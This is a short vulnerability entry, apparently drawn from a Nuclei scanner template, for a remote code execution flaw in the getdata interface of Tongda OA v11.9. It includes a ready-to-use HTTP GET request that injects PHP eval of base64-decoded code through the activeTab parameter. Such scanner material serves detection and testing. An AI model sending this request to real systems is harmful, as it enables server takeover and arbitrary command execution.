# Vulnerability: Tongda OA v11.9 getadata - Remote Code Execution
**Classification:** CWE-78,CWE-95
**Source:** Nuclei Template (`tongda-getdata-rce.yaml`)

## Description
There is an arbitrary command execution vulnerability in the getdata interface of Tongda OA v11.9. An attacker can execute arbitrary commands on the server to control server permissions through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage
```

